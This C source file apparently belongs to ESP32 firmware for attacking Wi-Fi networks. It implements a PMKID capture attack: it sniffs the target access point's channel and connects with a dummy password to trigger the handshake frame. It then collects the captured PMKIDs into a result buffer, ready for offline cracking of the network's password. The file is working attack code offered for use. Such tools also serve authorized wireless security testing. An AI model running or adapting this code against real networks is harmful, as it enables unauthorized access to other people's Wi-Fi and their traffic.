#include "attack_pmkid.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"

static const char* TAG = "main:attack_pmkid";

static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Got PMKID, stopping attack...");
    attack_set_result(FINISHED);
    attack_pmkid_stop();
    
    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
    // count how many PMKIDs in the list
    pmkid_item_t *pmkid_item = pmkid_item_head;
    unsigned pmkid_item_count = 1; 
    while((pmkid_item = pmkid_item->next) != NULL){
        pmkid_item_count++;
    }

    char *content = attack_alloc_result_content(pmkid_item_count * 16);

    // copy PMKIDs into continuous memory into "content" in result 
    pmkid_item = pmkid_item_head;
    do {
        pmkid_item_head = pmkid_item;
        memcpy(content, pmkid_item_head, 16);
        content += 16;
        pmkid_item = pmkid_item->next;
        free(pmkid_item_head);
    } while(pmkid_item != NULL);

    ESP_LOGD(TAG, "PMKID attack finished");
}

void attack_pmkid_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Attack on PMKID...");
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(attack_config->ap_record->primary);
    frame_analyzer_pmkid_capture_start(attack_config->ap_record->bssid);
    wifictl_sta_connect_to_ap(attack_config->ap_record, "dummypassword");
    ESP_ERROR_CHECK(esp_event_handler_register(DATA_FRAME_EVENTS, DATA_FRAME_EVENT_FOUND_PMKID, &pmkid_exit_condition_handler, NULL));
}

void attack_pmkid_stop(){
    wifictl_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_pmkid_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &pmkid_exit_condition_handler));
    ESP_LOGD(TAG, "PMKID attack stopped");
}